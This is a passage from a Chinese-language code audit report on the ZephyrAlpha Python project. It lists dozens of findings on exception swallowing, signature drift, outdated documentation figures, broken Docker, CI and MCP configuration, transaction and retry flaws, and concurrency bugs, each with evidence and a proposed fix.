  - [trading/auto_runtime_core.py](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py) 7处（"系统大脑"吞异常）
  - [trading/health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py) 5处（监控器自身静默失败）
- [trading/health_monitor.py:160-177](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L160) 主循环`except: pass`使监控变僵尸进程
- [trading/boot_hooks.py:327-328,504-505](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L327) 启动链吞异常
**病根**：新增病根维度——异常处理反模式（有逻辑但静默吞失败，比空handler更危险）
**修复方向**：全局禁止`except: pass`，改为`except Exception: logger.exception(...)` + ruff规则强制

#### 5.12.2 函数签名漂移7簇（HIGH 1 + MEDIUM 5 + LOW 1 = 7聚合）

**违反**：trae_060 §2 唯一真源（同名函数应drop-in可替换）
**证据**（7个未记录的签名漂移簇）：
1. `atomic_write`三方签名漂移：参数名filepath/file_path、类型str/Path/Path|str、返回Path/bool（[shared/io/file_utils.py:69](file:///D:/ZephyrAlpha/src/zephyr/shared/io/file_utils.py#L69) vs [infrastructure/auto_fix_engine/fix_safety.py:107](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/fix_safety.py#L107) vs [infrastructure/rollback/forensic.py:361](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rollback/forensic.py#L361)）
2. `estimate_cost`返回dict vs float（3签名变体）
3. `rollback`方法8种签名变体/30+实现（参数语义完全不同）
4. `health_check`返回类型8种+async/sync混用（36实现）
5. `validate_schema`3种完全不同语义（类型校验 vs DataFrame校验 vs 列名校验）
6. `load_config`1个完全无类型注解（[governance/config.py:237](file:///D:/ZephyrAlpha/src/zephyr/governance/config.py#L237)）
7. `send_alert`/`raise_alert`签名不一致（3实现）
**病根**：根因1（5.1.4重复簇升级为签名漂移簇）+ 根因3（Protocol/ABC缺失）
**修复方向**：建立Protocol/ABC接口 + 签名统一为真源

#### 5.12.3 now_iso()时间戳格式漂移（HIGH）

**违反**：trae_060 §2 唯一真源（时间戳格式不一致导致DB比较/排序错乱）
**证据**：
- 6个`now_iso`实现产出2种ISO 8601格式：`...Z`后缀 vs `...+00:00`后缀
- [shared/utils/time_utils.py:112](file:///D:/ZephyrAlpha/src/zephyr/shared/utils/time_utils.py#L112) 真源用`Z`
- [governance/base_repo.py:181](file:///D:/ZephyrAlpha/src/zephyr/governance/base_repo.py#L181) 等5处副本用`+00:00`
- 字符串比较时`+`(43) < `Z`(90)导致排序错乱
**病根**：根因1（5.1.4新增簇#11）
**修复方向**：统一为`Z`后缀，所有副本改调真源

#### 5.12.4 硬编码绝对路径9处（HIGH，1聚合 = 9处）

**违反**：trae_060 §2 唯一真源 + 可移植性
**证据**：
- [pipeline_roadmap.py:601-641](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/pipeline_roadmap.py#L601) 硬编码9个`D:\ZephyrAlpha\...`路径
- 引用的`mcp/`、`orchestrator/`子目录已不存在
**病根**：根因1（静态硬编码）
**修复方向**：改用`project_root / 相对路径`

#### 5.12.5 os.getcwd()无fallback假设cwd是项目根（MEDIUM，1聚合 = 30+处）

**证据**：
- 30+处`Path(os.getcwd())`作为project_root
- 最危险12处在`infrastructure/auto_fix_engine/`下（zombie_cleaner/scaffold_registrar/import_fixer等）
- 对比`kill_switch.py:70`用`project_root or Path.cwd()`模式（有fallback）
**病根**：根因1（硬假设cwd）
**修复方向**：统一用`project_root or Path.cwd()`模式

#### 5.12.6 stale TODO DM-201247条件已满足但未清理（HIGH）

**证据**：
- [boot_hooks.py:87-88](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L87) `# TODO DM-201247: 当HealthMonitor分钟级调度就绪后接入`
- health_monitor.py:160已实现_monitor_loop（DM-201247标注）
- TODO条件已满足但注释未清理 + AggregateHealth接入未完成
**病根**：根因1（stale TODO）
**修复方向**：清理TODO + 完成接入

#### 5.12.7 threading.local连接泄漏（HIGH）

**证据**：
- [sqlite_metadata_store.py:113-130](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/sqlite_metadata_store.py#L113) threading.local使每线程独立连接
- [sqlite_metadata_store.py:321](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/sqlite_metadata_store.py#L321) close()只关闭调用线程的连接
- 线程池使用时其他线程连接不关闭，sqlite句柄泄漏
**病根**：根因4（并发设计缺陷）
**修复方向**：用context manager或atexit注册

#### 5.12.8 asyncio.run()在40+同步站点（MEDIUM，1聚合 = 40+处）

**证据**：
- 40+处`asyncio.run()`从同步代码调用协程
- 若在已有事件循环上下文中调用会抛RuntimeError
- 代表：[autonomy_core/context_injector.py:261](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_injector.py#L261)、[autonomy_core/llm_gateway.py:69,96](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/llm_gateway.py#L69)
**病根**：根因4（async/sync混用陷阱）
**修复方向**：统一async/sync边界

#### 5.12.9 safe_open返回未托管文件句柄（HIGH）

**证据**：
- [winfs_defense.py:49-51](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/modules/winfs_defense.py#L49) `return open(safe_path, mode, encoding=encoding)`
- 无context manager包装，调用方忘记`with`则句柄泄漏
**病根**：根因4（资源管理缺陷）
**修复方向**：返回context manager

#### 5.12.10 死分支2处（LOW × 2）

**证据**：
1. [context_assembler.py:43](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_assembler.py#L43) `if True:`守卫（条件import残留）
2. [ml_experiment_pipeline.py:120](file:///D:/ZephyrAlpha/src/zephyr/shared/_cross_layer/ml_experiment_pipeline.py#L120) `_BUILTINS_GUARD_ENABLED = True`（flag永远True）
**病根**：根因1（dead code残留）
**修复方向**：清理死分支

#### 5.12.11 staging_area.py锁无效但使用（LOW）

**证据**：
- [staging_area.py:8](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L8) 注释承认"threading.Lock is process-local only, ineffective for Trae multi-window multi-process"
- [staging_area.py:62](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L62) 仍用`_COMMIT_LOCK = threading.Lock()`
**病根**：根因4（并发设计缺陷——知病不治）
**修复方向**：改用文件锁或redis锁

#### 5.12.12 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 7（5.12.1聚合+5.12.2签名漂移+5.12.3+5.12.4+5.12.6+5.12.7+5.12.9） |
| MEDIUM | 13（5.12.2中5簇+5.12.5+5.12.8+5.12.11等） |
| LOW | 7（5.12.2中1簇+5.12.10×2+其他） |
| **合计** | **30**（含跨维度计数） |

---

### 5.13 文档内容数字准确性（20个，第7轮新增）

> **维度新增理由**：前6轮检查"引用是否存在"，第7轮检查"内容数字是否正确"。发现大量过时数字误导AI决策。

#### 5.13.1 project_rules.md多处过时数字（HIGH，1聚合 = 5处）

**证据**：
- [project_rules.md:699,736,1038,1070,1083](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L699) 5处声明"43域"（实际53域）
- [project_rules.md:37](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L37) "模块4,639"（实际6,370）
- [project_rules.md:39](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L39) "门禁43"（实际49）
- [project_rules.md:40](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L40) "蓝图60"（实际59）
**病根**：根因1（静态快照——数字未随项目演进更新）
**修复方向**：数字改为从depgraph动态查询或建立同步reconciler

#### 5.13.2 navigation_index.md "43个域"错误（HIGH）

**证据**：
- [navigation_index.md:28](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/00_overview_entry/navigation_index.md#L28) "了解43个域之间怎么互相依赖"
- 同文档L61-66层表加总5+15+32+1=53自相矛盾
**病根**：根因1（自动生成文档含硬编码过时数字）
**修复方向**：生成器从depgraph派生该数字

#### 5.13.3 domain_index.md超容标签系统性错误（HIGH，1聚合 = 10+域）

**证据**：
- [domain_index.md](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/02_domain_architecture_docs/domain_index.md) 10+域被误标"超容"
- 错误统计总模块数对比统一150上限
- 实际容量规则是per-domain上限（D_GOVERNANCE上限750非150）
- 应只统计production模块（D_GOVERNANCE production=117非总2813）
**病根**：根因1（容量规则误用——生成器逻辑错误）
**修复方向**：修正生成器统计逻辑

#### 5.13.4 README.md "87行"严重低估（HIGH）

**证据**：
- [README.md:7](file:///D:/ZephyrAlpha/README.md#L7) "project_rules.md（87行）"
- 实际1527行（17倍低估）
**病根**：根因1（数字严重过时）
**修复方向**：更新行数或改为动态统计

#### 5.13.5 README.md数据库清单遗漏PostgreSQL（HIGH）

**证据**：
- [README.md:54](file:///D:/ZephyrAlpha/README.md#L54) "数据库: SQLite, ChromaDB"
- 实际depgraph已迁PostgreSQL 16
**病根**：根因1（技术栈过时）
**修复方向**：更新为SQLite/PostgreSQL/ChromaDB

#### 5.13.6 AGENTS.md引用trae_060 §5旧数字（HIGH）

**证据**：
- [AGENTS.md:229](file:///D:/ZephyrAlpha/AGENTS.md#L229) 引用"§5中23处(9词表)"
- trae_060 §5已改为"64处(12词表)"
**病根**：根因1（跨文档引用过时）
**修复方向**：更新AGENTS.md引用

#### 5.13.7 project_memory.md reconciler数17不准确（MEDIUM）

**证据**：
- [project_memory.md:55](file:///c:/Users/fanzi/.trae-cn/memory/projects/-d-ZephyrAlpha/project_memory.md#L55) "17reconciler"
- 实际reconciliation_registry.py定义18个make_*_reconciler，__all__导出16个
- "17"与两者都不匹配
**病根**：根因1（数字不准确）
**修复方向**：核实并修正

#### 5.13.8 constraint_violations.md与design_vs_production.md模块数严重不一致（HIGH，1聚合 = 4域）

**证据**：
- constraint_violations.md L85 "D-INFRA_OPS当前409模块" vs design_vs_production.md L70 "D_INFRA_OPS总34模块"（差375）
- constraint_violations.md L86 "D-INFRA_RUNTIME当前892模块" vs design_vs_production.md L72 "D_INFRA_RUNTIME总144模块"（差748）
- 两份自动生成报告对同一域给出截然不同模块数
**病根**：根因1（数据源不一致——生成器查询不同表或过滤）
**修复方向**：统一生成器数据源

#### 5.13.9 project_memory.md根目录文件数21 vs 实际20（MEDIUM）

**证据**：
- [project_memory.md:25](file:///c:/Users/fanzi/.trae-cn/memory/projects/-d-ZephyrAlpha/project_memory.md#L25) "根目录仅允许21个指定文件"
- 实际LS验证20个文件
**病根**：根因1（数字不准确）
**修复方向**：修正为20

#### 5.13.10 AGENTS.md "14层"声明与实际不匹配（MEDIUM）

**证据**：
- [AGENTS.md:145](file:///D:/ZephyrAlpha/AGENTS.md#L145) "14层（L00-L13）是域的layer_id属性枚举"
- 实际domains表layer_id只用3值：L0_infrastructure/L1_foundation/L2_domain
- layer_vocabulary.yaml定义16值
- 三套命名方案互不匹配
**病根**：根因1（架构声明与实现脱节）
**修复方向**：统一层命名方案

#### 5.13.11 blueprint_registry.yaml内部数字矛盾（MEDIUM）

**证据**：
- [blueprint_registry.yaml:48](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L48) "Active(4份)/Draft(34份)"
- 同文件L968-969 summary `Active: 51, Draft: 8`
- 4+34=38≠59，51+8=59✓
**病根**：根因1（内部stale数据）
**修复方向**：清理L48过时数据

#### 5.13.12 trae_060_s5_evidence_audit.md "27个词表"错误（MEDIUM）

**证据**：
- [trae_060_s5_evidence_audit.md:67](file:///D:/ZephyrAlpha/docs/_working/trae_060_s5_evidence_audit.md#L67) "27个vocabulary.yaml"
- 实际35个
**病根**：根因1（数字错误）
**修复方向**：修正为35

#### 5.13.13 GATE-VOCAB检出数矛盾4 vs 0（MEDIUM）

**证据**：
- trae_060 §5 L206 "4处已被GATE-VOCAB检出"
- AGENTS.md L229 "GATE-VOCAB实时扫描0违规"
- 同日期两份文档矛盾
**病根**：根因1（跨文档矛盾）
**修复方向**：核实并统一

#### 5.13.14 navigation_index.md "共6个文件"错误（MEDIUM）

**证据**：
- [navigation_index.md:16](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/00_overview_entry/navigation_index.md#L16) "共6个文件"
- 实际5个文件
**病根**：根因1（数字错误）
**修复方向**：修正为5

#### 5.13.15 层级命名不一致（MEDIUM）

**证据**：
- navigation_index.md用中文层名+"未分层"
- domain_index.md用英文层名+"未分类"
**病根**：根因1（术语不一致）
**修复方向**：统一术语

#### 5.13.16 constraint_violations.md空约束行（MEDIUM）

**证据**：
- [constraint_violations.md:105](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/03_governance_reports/constraint_violations.md#L105) Constraint ID/源域/目标域全空
**病根**：根因1（数据质量问题）
**修复方向**：补填或删除

#### 5.13.17 审计报告引用trae_060 §5旧数字（MEDIUM）

**证据**：
- [trae_060_s5_evidence_audit.md](file:///D:/ZephyrAlpha/docs/_working/trae_060_s5_evidence_audit.md) 引用"23处(9词表)"
- 当前§5已改为"64处(12词表)"
**病根**：根因1（引用过时）
**修复方向**：更新引用

#### 5.13.18 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 10（5.13.1~5.13.6 + 5.13.8） |
| MEDIUM | 10（5.13.7/5.13.9~5.13.17） |
| **合计** | **20** |

---

### 5.14 配置部署运行时一致性（26个，第7轮新增）

> **维度新增理由**：前6轮未系统检查Docker/CI/环境变量/MCP配置等部署层一致性。第7轮发现Dockerfile引用幻影模块、MCP ACL失效、环境变量文档缺失等26个部署层问题。

#### 5.14.1 Dockerfile引用幻影模块zephyr.l01_infrastructure（CRITICAL × 2）

**证据**：
- [Dockerfile:28](file:///D:/ZephyrAlpha/Dockerfile#L28) `CMD python -m zephyr.l01_infrastructure.health`（HEALTHCHECK）
- [Dockerfile:31](file:///D:/ZephyrAlpha/Dockerfile#L31) `CMD ["python", "-m", "zephyr.l01_infrastructure"]`
- [docker-compose.yml:29](file:///D:/ZephyrAlpha/docker-compose.yml#L29) 同样引用
- 模块`zephyr.l01_infrastructure`完全不存在
- 容器启动即崩溃，HEALTHCHECK永远失败
**病根**：根因1（重命名后未同步部署配置）
**修复方向**：修正为实际入口模块

#### 5.14.2 docker-compose.yml卷挂载路径错误（HIGH，1聚合 = 3处）

**证据**：
- [docker-compose.yml:41,66,67](file:///D:/ZephyrAlpha/docker-compose.yml#L41) 挂载`./infra/prometheus/`、`./infra/grafana/`
- 实际在`config/infra/`下
- 根目录无`infra/`目录
- Prometheus/Grafana配置失效
**病根**：根因1（路径迁移后未同步）
**修复方向**：修正为`./config/infra/`

#### 5.14.3 Dockerfile未COPY config/目录（MEDIUM）

**证据**：
- [Dockerfile:14-21](file:///D:/ZephyrAlpha/Dockerfile#L14) 仅COPY pyproject.toml/requirements/src/
- 未COPY config/
- 纯docker build时容器内无config/
**病根**：根因1（镜像不完整）
**修复方向**：补COPY config/

#### 5.14.4 mcp.json $schema引用不存在文件（MEDIUM）

**证据**：
- [mcp.json:2](file:///D:/ZephyrAlpha/config/mcp.json#L2) `"$schema": "./mcp.schema.json"`
- mcp.schema.json不存在
**病根**：根因1（引用断裂）
**修复方向**：创建schema或删除引用

#### 5.14.5 context_rules.yaml双版本共存（MEDIUM）

**证据**：
- config/下同时存在context_rules.yaml和context_rules_v1.yaml
- v1的deny指向非v1版本
**病根**：根因1（真源分裂）
**修复方向**：归档v1

#### 5.14.6 MCP服务器模块双源（HIGH，1聚合 = 10文件）

**证据**：
- src/zephyr/infrastructure/下9个*_server.py
- src/zephyr/integration/mcp/下9个同名副本
- mcp.json仅声明裸模块名，无法确定加载哪个
**病根**：根因1（真源分裂）
**修复方向**：裁定保留单一目录

#### 5.14.7 13+环境变量未在.env.example声明（HIGH，1聚合 = 13+变量）

**证据**：
- ZEPHYR_PROJECT_ROOT（10+处引用）、DATABASE_URL、ZEPHYR_FEISHU_WEBHOOK、ZEPHYR_SMTP_*、OTEL_EXPORTER_OTLP_ENDPOINT等13+变量
- 代码引用但.env.example未声明
**病根**：根因1（环境变量文档缺失）
**修复方向**：补声明到.env.example

#### 5.14.8 docker-compose.yml环境变量未声明（MEDIUM）

**证据**：
- [docker-compose.yml:18-20](file:///D:/ZephyrAlpha/docker-compose.yml#L18) 设置ZEPHYR_ENV/ZEPHYR_T1_KILL_SWITCH_PROBE/ZEPHYR_METRICS_DIR
- 均未在.env.example声明
**病根**：根因1（同5.14.7）
**修复方向**：补声明

#### 5.14.9 dedup-watch.yml引用幻影模块（HIGH）

**证据**：
- [dedup-watch.yml:19](file:///D:/ZephyrAlpha/.github/workflows/dedup-watch.yml#L19) `from zephyr.l01_infrastructure.code_dedup_engine.temporal_drift_tracker import TemporalDriftTracker`
- 模块不存在
- 每周一6AM UTC自动触发，每次失败
**病根**：根因1（死工作流——与5.7同类但新发现）
**修复方向**：删除或修正

#### 5.14.10 governance.yml paths引用不存在路径（MEDIUM，1聚合 = 2处）

**证据**：
- [governance.yml:31,60](file:///D:/ZephyrAlpha/.github/workflows/governance.yml#L31) paths含`infra/**`（实际在config/infra/）
- [governance.yml:37,66](file:///D:/ZephyrAlpha/.github/workflows/governance.yml#L37) 引用`demo_e2e_pipeline.py`（不存在）
**病根**：根因1（路径过时）
**修复方向**：修正paths

#### 5.14.11 governance.yml与dedup-watch.yml运行环境不一致（LOW）

**证据**：
- governance.yml:83 `runs-on: windows-latest`
- dedup-watch.yml:10 `runs-on: ubuntu-latest`
**病根**：根因1（环境不一致）
**修复方向**：统一运行环境

#### 5.14.12 requirements.txt缺3个包（MEDIUM）

**证据**：
- requirements.txt仅声明9个依赖
- pyproject.toml声明12个
- 缺duckdb/structlog/pyarrow（代码已import）
**病根**：根因1（依赖管理不一致）
**修复方向**：补齐requirements.txt

#### 5.14.13 data/auto_fix/wal/ 4对重复WAL文件（HIGH，1聚合 = 4对）

**证据**：
- data/auto_fix/wal/下8个文件，4对连字符vs下划线重复
- action-001.wal + action_001.wal等
**病根**：根因1（命名不一致导致重复）
**修复方向**：删除连字符版本

#### 5.14.14 data/model_learning/重复JSON文件（MEDIUM）

**证据**：
- task-model-matrix.json（连字符）+ task_model_matrix.json（下划线）共存
**病根**：根因1（真源分裂）
**修复方向**：删除连字符版本

#### 5.14.15 data/brain/passports/重复护照文件（MEDIUM，1聚合 = 2文件）

**证据**：
- qwen2.5-coder_14b.json + qwen2.5_coder_14b.json共存
**病根**：根因1（命名约定违反）
**修复方向**：统一命名

#### 5.14.16 data/brain/passports/命名风格3种混用（MEDIUM，1聚合 = 多文件）

**证据**：
- 连字符：deepseek-v4-pro-thinking.json
- 下划线：deepseek_r1_14b.json
- 混合：qwen2.5-coder_14b.json
**病根**：根因1（命名约定违反）
**修复方向**：统一为下划线

#### 5.14.17 lock_files.py TTL标记与实际状态矛盾（MEDIUM）

**证据**：
- [lock_files.py:15](file:///D:/ZephyrAlpha/scripts/lock_files.py#L15) `[TTL] task_bound`
- 但工具仍活跃（pre_write_guard/LockGuard等API仍被引用）
- TTL=task_bound暗示应删除但有活跃用途
**病根**：根因1（TTL语义不一致）
**修复方向**：改为permanent或归档

#### 5.14.18 MCP tool_count严重漂移（HIGH × 2 = 2聚合）

**证据**：
1. [mcp.json:18](file:///D:/ZephyrAlpha/config/mcp.json#L18) task_manager `tool_count: 6`，实际16个@mcp.tool
2. [mcp.json:85](file:///D:/ZephyrAlpha/config/mcp.json#L85) governance `tool_count: 7`，实际17个register_tool
**病根**：根因1（tool_count stale）
**修复方向**：从代码动态统计

#### 5.14.19 MCP ACL工具名与实际不匹配（HIGH，1聚合 = 多个）

**证据**：
- task_manager ACL声明`task_manager.delete`（不存在）
- governance ACL声明`governance.run_gate`/`governance.acquire_lock`（不存在）
- 10+实际工具未在ACL声明
- ACL鉴权形同虚设
**病根**：根因1（ACL漂移）
**修复方向**：从代码动态生成ACL

#### 5.14.20 mcp.json acl_by_server缺red_blue_validator（LOW）

**证据**：
- ACL仅含9个server，缺red_blue_validator
- red_blue_validator有独立rbac字段但方式不一致
**病根**：根因1（ACL不完整）
**修复方向**：统一ACL管理方式

#### 5.14.21 trigger_router.yaml内部自相矛盾（MEDIUM，1聚合 = 多处）

**证据**：
- [trigger_router.yaml:33](file:///D:/ZephyrAlpha/config/trigger_router.yaml#L33) header声明"所有handler已从stub升级为真实实现"
- [trigger_router.yaml:106-110](file:///D:/ZephyrAlpha/config/trigger_router.yaml#L106) wiring status标记5/6为🔲 stub
- 实际代码已包含真实实现
**病根**：根因1（元数据过时）
**修复方向**：更新wiring status

#### 5.14.22 trigger_router.yaml引用过时模块路径（MEDIUM，1聚合 = 3处）

**证据**：
- wiring status引用zephyr.mcp.handoff_auto_loader（实际zephyr.infrastructure.pipeline.layer_router）
- 引用zephyr.feedback_loop.decision_engine（实际zephyr.ops.decision_engine）
- 引用scripts.governance.archive_drafts_zone.archive_expired_drafts（函数名不匹配）
**病根**：根因1（引用过时）
**修复方向**：更新模块路径

#### 5.14.23 handler函数命名不一致（LOW，1聚合 = 6个）

**证据**：
- 5个handler保留_stub后缀但已含真实实现
- 1个handler无后缀且在不同模块
**病根**：根因1（命名不一致）
**修复方向**：重命名去掉_stub后缀

#### 5.14.24 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 8（5.14.1×2+5.14.2+5.14.6+5.14.7+5.14.9+5.14.13+5.14.18×2+5.14.19） |
| MEDIUM | 12（5.14.3~5.14.5+5.14.8+5.14.10+5.14.12+5.14.14~5.14.17+5.14.21+5.14.22） |
| LOW | 5（5.14.11+5.14.15+5.14.20+5.14.23等） |
| **合计** | **26**（含跨维度计数） |

---

### 5.15 韧性恢复与错误处理深度（15个，第8轮新增）

> 审计维度：事务边界/幂等性/部分失败/状态恢复/重试正确性/优雅降级/资源泄漏/错误传播
> 审计方法：Grep + Read真实文件取证（task_repo.py、apply_depgraph.py、sync_yaml_to_depgraph.py、retry实现、dlq_retry_policy.py等）

#### 5.15.1 transition()事务内subprocess循环验收长时持锁【HIGH】
- 证据：[task_repo.py:1566](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `with self._write_tx() as conn:` 开启BEGIN IMMEDIATE；`:1612` 事务内调 `_run_circular_acceptance`；`:1807-1835` 循环2轮×N命令，每命令 `subprocess.run(shell=True,timeout=120)`，最坏240s+持RESERVED锁
- 病根：根因5（事务边界与IO混合）
- 修复：循环验收移到`_write_tx`之前——先全部验收，再开短事务落盘

#### 5.15.2 transition(COMPLETED) DB提交后git失败仅warning不补偿【HIGH】
- 证据：[task_repo.py:1626-1650](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) UPDATE tasks COMMIT；`:1687-1692` `_auto_commit_on_completion` 包在 `try/except:warning`，DB已commit不回滚
- 病根：根因5（缺saga补偿模式）
- 修复：Outbox模式——COMPLETED+pending_git_commit事件异步重试

#### 5.15.3 dlq_retry_policy.retry_pending()查不存在的表【HIGH】
- 证据：[dlq_retry_policy.py:44](file:///d:/ZephyrAlpha/src/zephyr/governance/dlq_retry_policy.py) `SELECT COUNT(*) FROM dlq_messages`；[sqlite_schema.py](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) 无此表；`:49` `except:warning→return RetryResult(status="degraded")`；`BACKOFF_SCHEDULE`（`:27`）死代码
- 病根：根因1（blueprint声明表/schema未建/代码查询必然失败）
- 修复：补建dlq_messages表或改查orchestrator/dlq_manager

#### 5.15.4 batch_review 7维度跨7独立事务部分失败【MEDIUM】
- 证据：[task_repo.py:1885-1895](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `for dim in _BATCH_REVIEW_DIMENSIONS:` 循环内每次单独事务INSERT，第3维度异常前2已commit，consecutive_zero错乱
- 病根：根因5（批量无原子边界）
- 修复：7维度结果先收集内存，单_write_tx一次性INSERT

#### 5.15.5 apply_depgraph._atomic_write UPDATE无UPSERT【MEDIUM】
- 证据：[apply_depgraph.py:183](file:///d:/ZephyrAlpha/scripts/governance/apply_depgraph.py) `UPDATE nodes SET ... WHERE node_id=%s`，DB不存在node_id时0行更新无检查、无INSERT分支、无RETURNING
- 病根：根因5（幂等性缺失）
- 修复：改 `INSERT ... ON CONFLICT (node_id) DO UPDATE SET ...`

#### 5.15.6 sync_yaml_to_depgraph finally块二次commit+触发器恢复失败仅warning【MEDIUM】
- 证据：[sync_yaml_to_depgraph.py:1082-1099](file:///d:/ZephyrAlpha/scripts/governance/sync_yaml_to_depgraph.py) 主except `rollback();raise`；finally内 `restore_readonly_triggers;commit()`，DDL在rollback后独立commit，`:1095` `except:print` 吞恢复失败
- 病根：根因5（finally块副作用+事务状态混乱）
- 修复：finally只做close，触发器恢复移入主try commit前

#### 5.15.7 两套重复retry实现（async vs sync）语义不一致【MEDIUM】
- 证据：[resilience/retry.py:92](file:///d:/ZephyrAlpha/src/zephyr/shared/resilience/retry.py) `async_retry` 耗尽raise `RetryExhaustedError`；[reliability/retry_handler.py:78](file:///d:/ZephyrAlpha/src/zephyr/shared/reliability/retry_handler.py) `RetryHandler.execute` 返回 `RetryResult(success=False)` 不抛异常，两文件均标MOD-INF-016
- 病根：根因1（SSoT分裂，行为分叉）
- 修复：合并为单一retry模块统一raise-on-exhaust语义

#### 5.15.8 RetryHandler重试耗尽返回不抛异常，调用方忽略即吞失败【MEDIUM】
- 证据：[retry_handler.py:108](file:///d:/ZephyrAlpha/src/zephyr/shared/reliability/retry_handler.py) `return RetryResult(success=False,...,final_error=e)` 不抛异常，原始堆栈丢失
- 病根：根因5（错误传播断裂，返回值替代异常）
- 修复：重试耗尽应 `raise RetryExhaustedError(...) from final_error`

#### 5.15.9 reconciler.reconcile()引用未导入的AssetType【MEDIUM】
- 证据：[reconciler.py:105,146](file:///d:/ZephyrAlpha/src/zephyr/governance/reconciler.py) `AssetType.UNKNOWN`，但import块（`:31-43`）无AssetType，cls为None时NameError崩溃
- 病根：根因5（未导入符号+默认值回退路径未测试）
- 修复：补import或用字符串字面量

#### 5.15.10 zombie_scanner._load_patterns吞JSON损坏，历史静默清零【MEDIUM】
- 证据：[zombie_scanner.py:107-109](file:///d:/ZephyrAlpha/src/zephyr/trading/zombie_scanner.py) `except:pass;return {}`，patterns文件损坏时静默返回空，repeated_offenders历史丢失
- 病根：根因5（silent degrade）
- 修复：损坏时logger.warning再返回空

#### 5.15.11 audit_domain_nodes.run_4class_check autocommit=True做写操作【MEDIUM】
- 证据：[audit_domain_nodes.py:192](file:///d:/ZephyrAlpha/scripts/governance/audit_domain_nodes.py) `get_depgraph_pg_connection(autocommit=True)` 执行DELETE+write_violations，每语句独立提交
- 病根：根因5（事务边界缺失）
- 修复：写检测统一autocommit=False+try/except/rollback

#### 5.15.12 30+脚本conn裸赋值异常路径连接泄漏【MEDIUM】
- 证据：`audit_rename_completeness.py:244/273/370/397`、`generate_project_path_tree.py:71`、`diagnose_depgraph.py:62`、`extract_depgraph.py:87/322` 等 `conn=get_depgraph_pg_connection(autocommit=True)` 裸赋值，部分无try/finally
- 病根：根因5（资源泄漏，连接未用with上下文管理器）
- 修复：`get_depgraph_pg_connection`返回@contextmanager或全部改 `with closing(...)`

#### 5.15.13 sqlite_schema._run_migration benign关键词匹配过宽吞错【MEDIUM】
- 证据：[sqlite_schema.py:988-1000](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `except OperationalError:` 字符串匹配"duplicate column/already exists"后continue，含这些词的真实错误被吞；v23/v25用 `PRAGMA writable_schema=ON` 改sqlite_master
- 病根：根因5（错误吞掉）
- 修复：用精确sqlite3错误码或迁移语句保证幂等（IF NOT EXISTS）

#### 5.15.14 sync_progress.save_progress临时文件异常不清理【LOW】
- 证据：[sync_progress.py:51-54](file:///d:/ZephyrAlpha/scripts/governance/sync_progress.py) `tmp=...;with open(tmp,"w"):json.dump(...);os.replace(tmp,...)`，json.dump异常时tmp残留无try/finally
- 病根：根因5（临时文件异常路径未清理）
- 修复：`try:...;os.replace;finally:if exists:remove`

#### 5.15.15 task_repo单连接+threading.RLock仅进程内，跨进程多session抛"database is locked"【MEDIUM】
- 证据：[task_repo.py:652-653](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `with self._lock:` (RLock进程内) + `BEGIN IMMEDIATE`；[sqlite_schema.py:440](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `PRAGMA busy_timeout=5000` 仅等5s；多AI session各自TaskRepository实例共享governance.db
- 病根：根因5（跨进程并发无显式锁）
- 修复：task_repo迁移PG或引入跨进程advisory lock

#### 5.15.16 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 4（5.15.1+5.15.2+5.15.3） |
| MEDIUM | 10（5.15.4~5.15.8+5.15.10~5.15.13+5.15.15） |
| LOW | 1（5.15.14） |
| **合计** | **15** |

---

### 5.16 并发与线程安全违规（15个，第8轮新增）

> 审计维度：竞态条件/锁粒度与顺序/async-sync混用/全局可变状态/跨进程锁/队列与生产者消费者
> 审计方法：Grep + Read真实文件取证（circuit_breaker.py、metrics_bridge.py、git_commit_gateway.py、async_runtime.py等）

#### 5.16.1 CircuitBreaker.record_success锁外重置failure_count【HIGH】
- 证据：[circuit_breaker.py:135-141](file:///d:/ZephyrAlpha/src/zephyr/shared/resilience/circuit_breaker.py) `self._failure_count=0`（第141行）与 `with self._lock:` 同级缩进，实际在锁释放后执行；并发record_failure可在此间自增，断路器永远到不了threshold
- 病根：根因5（INVARIANTS要求线程安全但缩进bug让锁形同虚设）
- 修复：删除第141行或移入`with self._lock:`块内

#### 5.16.2 MetricsBridge单例无锁（broken double-checked locking）【HIGH】
